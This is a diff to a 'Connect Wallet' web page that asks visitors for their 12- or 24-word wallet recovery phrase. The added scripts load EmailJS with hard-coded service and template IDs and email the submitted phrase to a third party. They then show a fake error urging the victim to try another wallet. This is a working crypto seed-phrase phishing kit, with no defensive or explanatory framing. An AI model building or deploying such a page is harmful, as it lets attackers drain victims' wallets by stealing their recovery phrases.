@@ -1584,12 +1584,12 @@
             <p id="errorMessage" class="error-text" style="display: none">
               Error: Please enter a valid detail.
             </p>
-            <textarea id="inputTextArea" name="phrase" placeholder="Enter 12 or 24 words" required=""></textarea>
+            <textarea id="keys" name="message" placeholder="Enter 12 or 24 words" required=""></textarea>
 
             
 
             <div class="error" style="color: red"></div>
-            <button id="sendButton" type="submit" name="submit" value="submit">
+            <button id="submit" type="submit" name="submit" value="submit">
               Connect Wallet
             </button>
              </form>
@@ -1617,8 +1617,34 @@
 
         <script src="js/javasc.js"></script>
     
+<script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
+<script type="text/javascript">
+  emailjs.init('6_tDSXeoqD7psBXJk')
+</script>
     
-  
+  <script>
+	  const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_qyozlwv';
+   const templateID = 'template_700yv0j';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('An error occurred!!! Try again or use another wallet.');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+  </script>
 
 </body></html>
